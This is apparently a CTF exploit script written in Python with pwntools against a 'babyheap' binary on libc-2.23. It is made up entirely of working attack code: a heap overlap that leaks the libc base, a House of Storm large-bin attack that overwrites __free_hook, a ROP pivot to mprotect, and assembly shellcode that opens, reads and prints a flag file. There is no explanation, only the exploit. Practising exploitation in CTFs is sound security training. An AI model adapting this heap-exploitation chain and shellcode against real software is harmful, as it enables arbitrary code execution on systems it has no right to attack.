from pwn import *
def cmd(c):
	p.sendlineafter(": \n",str(c))
def add(size):
	cmd(1)
	p.sendlineafter("ize: ",str(size))
	
def edit(idx,c):
	cmd(2)
	p.sendlineafter("dex: ",str(idx))
	p.sendafter("tent: ",c)
def free(idx):
	cmd(3)
	p.sendlineafter("dex: ",str(idx))
def show(idx):
	cmd(4)
	p.sendlineafter("dex: ",str(idx))
context.arch='amd64'

libc=ELF("./libc-2.23.so")
#p=remote("123.206.174.203",20001)

p=process('./babyheap')
add(0x500)#0
add(0x88)#1
add(0x88)#2
free(0)
add(0x18)#0
edit(0,"A"*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)
add(0x2d8)#1
add(0x88)#3
add(0x48)#5
free(4)
show(5)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7dd1b78-0x7ffff7a0d000)
libc.address=base
log.warning(hex(base))
#get libc base
add(0x458+0x90)#4
#clear main_arena

aim=libc.sym['__free_hook']
bk=aim-0x20+8
bk_nextsize=aim-0x20-0x18-5
add(0x500)#6
add(0x88)#7
add(0x88)#8
free(6)
add(0x18)#6
edit(6,"A"*0x18)
add(0x88)#9
add(0x88)#10
free(9)
free(7)
add(0x2d8)#7
add(0x78)#9
add(0x48)#11
add(0x4a9)#12
edit(10,p64(0)*7+p64(0x4a1)+p64(0)+p64(bk)+p64(0)+p64(bk_nextsize))#edit the head of LARGECHUNK
edit(11,p64(0)+p64(0x21)*7)
free(10)
edit(11,p64(0)+p64(0x4b1)+p64(0)+p64(aim-0x20))#edit the head & bk of UNSORTEDCHUNK
add(0x48)#10
#House of Storm

magic=libc.sym['__free_hook']+0x8
top='''
mov rdx,0x1234000
mov al,9
mov rdi,rdx
jmp .+0x14
'''
shellcode='''
mov rsi,0x1000
mov dx,0x7
mov r10,0x22
syscall
mov rsi,rax
xchg r9,rax
mov rdi,rax
syscall
push 0x1234000
ret
'''
edit(10,asm(top).ljust(0x10,'\x00')+p64(base+0x47b75)+p64(magic-0x18)+asm(shellcode))
payload=p64(0x7ffff7b15e89-0x7ffff7a3b000+base)+p64(0x7ffff7a7d4d5-0x7ffff7a3b000+base)+p64(0)
payload=payload.ljust(0x28,'\x00')+p64(0xfffffffffffffff)+p64(0)
payload=payload.ljust(0x68,'\x00')+p64(magic&0xffffffffffff000)+p64(0x1000)
payload=payload.ljust(0x88,'\xff')+p64(0x7)
payload=payload.ljust(0xa0,'\x00')+p64(magic)+p64(libc.sym['mprotect'])
edit(12,payload)
free(12)

"""
gdb.attach(p,'''
b free
c
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
si
''')
"""
context.log_level='debug'

"""
sh='''
mov rsp,0x1234400
push 0x23
push 0x1234100
'''
sh=asm(sh)
context.arch='i386'
shellcode='''
mov eax,5
push 0x6761
push 0x6c662f2e
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80
mov ebx, eax
mov eax,3
mov ecx,0x12344000
mov edx,0x72
int 0x80
mov eax,0x4
mov ebx,0x1
mov ecx,0x12344000
mov edx,0x30
int 0x80
'''
shellcode=asm(shellcode)
p.send((sh+p64(0x8964d8f7002bca4c)).ljust(0x100)+shellcode)
"""

sh='''
mov rsp,0x1234400
mov rax,2
mov rdi,0x67616c662f2e
push rdi
mov rdi,rsp
mov rsi,0
mov rdx,0
syscall
mov rdi,rax
mov rax,0
mov rsi,0x1234500
mov rdx,0x100
syscall
mov rax,1
mov rdi,1
mov rsi,0x1234500
mov rdx,0x100
syscall
'''
sh=asm(sh)
p.send(sh)
p.interactive()
